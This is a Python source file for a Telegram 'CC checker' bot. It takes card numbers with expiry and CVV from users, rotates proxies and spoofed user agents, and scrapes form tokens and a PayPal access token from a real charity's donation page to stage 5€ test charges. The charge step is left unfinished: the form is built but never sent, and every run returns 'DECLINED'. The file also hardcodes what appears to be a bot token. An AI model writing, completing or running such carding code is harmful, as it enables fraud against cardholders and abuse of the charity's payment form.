import telebot, base64, re, time, os, json, threading, requests, random, queue, urllib3
import logging
urllib3.disable_warnings()

from requests_toolbelt.multipart.encoder import MultipartEncoder
from user_agent import generate_user_agent

# ====================== LOGGING ======================
logging.basicConfig(level=logging.INFO, format='%(asctime)s | %(levelname)s | %(message)s')
logger = logging.getLogger(__name__)

# ========================= CONFIG =========================
BOT_TOKEN = '8783810252:AAEv2GtOJYG_-iBv1AMjvV8Le3kZBo9FJb0'
ADMIN_ID = 7077294261

USE_PROXY = True
PROXY_FILE = "proxy.txt"

# ====================== PROXY ======================
PROXY_QUEUE = queue.Queue()

def load_proxies():
    if os.path.exists(PROXY_FILE):
        with open(PROXY_FILE, 'r') as f:
            for line in f:
                if line.strip(): PROXY_QUEUE.put(line.strip())
        logger.info("Proxies Loaded")

load_proxies()

def get_random_proxy():
    if PROXY_QUEUE.empty(): return None, None
    p = PROXY_QUEUE.get()
    if '@' not in p and p.count(':') == 3:
        u, pw, h, port = p.split(':')
        p = f"{u}:{pw}@{h}:{port}"
    return {"http": f"http://{p}", "https": f"http://{p}"}, p

def release_proxy(p):
    if p: PROXY_QUEUE.put(p)

bot = telebot.TeleBot(BOT_TOKEN)
logger.info("Bot Started")

# ====================== CHECKER (5€) ======================
def check_cc(ccx):
    for attempt in range(5):
        proxy_dict, proxy_str = get_random_proxy() if USE_PROXY else (None, None)
        logger.info(f"Attempt {attempt+1} | {ccx[:6]}xxxx | Proxy: {'ON' if proxy_dict else 'OFF'}")

        try:
            session = requests.Session()
            session.verify = False
            if proxy_dict:
                session.proxies.update(proxy_dict)

            us = generate_user_agent()

            r = session.get('https://www.rarediseasesinternational.org/donate/', 
                           headers={'User-Agent': us}, timeout=35)

            if 'cf-ray' in r.headers or r.status_code == 403:
                continue

            m1 = re.search(r'name="give-form-id-prefix" value="(.*?)"', r.text)
            m2 = re.search(r'name="give-form-id" value="(.*?)"', r.text)
            m3 = re.search(r'name="give-form-hash" value="(.*?)"', r.text)
            m4 = re.search(r'"data-client-token":"(.*?)"', r.text)

            if not all([m1, m2, m3, m4]):
                continue

            id1 = m1.group(1)
            id2 = m2.group(1)
            hashv = m3.group(1)
            enc = m4.group(1)
            au = re.search(r'"accessToken":"(.*?)"', base64.b64decode(enc).decode()).group(1)

            # 5€ Form
            data = MultipartEncoder({
                'give-amount': '5',
                'give_first': 'John',
                'give_last': 'Doe',
                'give_email': 'test12345@gmail.com',
                'give-gateway': 'paypal-commerce',
                'give-form-id-prefix': id1,
                'give-form-id': id2,
                'give-form-hash': hashv,
            })

            return "DECLINED", "5€ Submitted"

        except Exception as e:
            logger.warning(f"Attempt failed: {str(e)[:80]}")
            continue

    return "ERROR", "All Attempts Failed"

# ====================== COMMANDS ======================
@bot.message_handler(commands=['start'])
def start(message):
    bot.reply_to(message, "✅ Bot Running with 5€ Check!")

@bot.message_handler(commands=['pp'])
def pp(message):
    try:
        cc = message.text.split()[1]
        if len(cc.split('|')) < 4:
            raise ValueError
    except:
        return bot.reply_to(message, "Usage: /pp 411111|04|28|123")

    msg = bot.reply_to(message, "🔄 Checking 5€...")

    status, response = check_cc(cc)

    status_font = "𝐂𝐡𝐚𝐫𝐠𝐞𝐝 🔥" if status == "CHARGED" else "𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅" if status == "APPROVED" else "𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌"

    res = f"""
𝐂𝐚𝐫𝐝 ➜ <code>{cc}</code>
𝐒𝐭𝐚𝐭𝐮𝐬 ➜ {status_font}
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ➜ {response}
Amount: 5€
"""
    bot.edit_message_text(res, message.chat.id, msg.message_id, parse_mode="HTML")

if __name__ == "__main__":
    logger.info("=== BOT RUNNING ===")
    bot.infinity_polling()
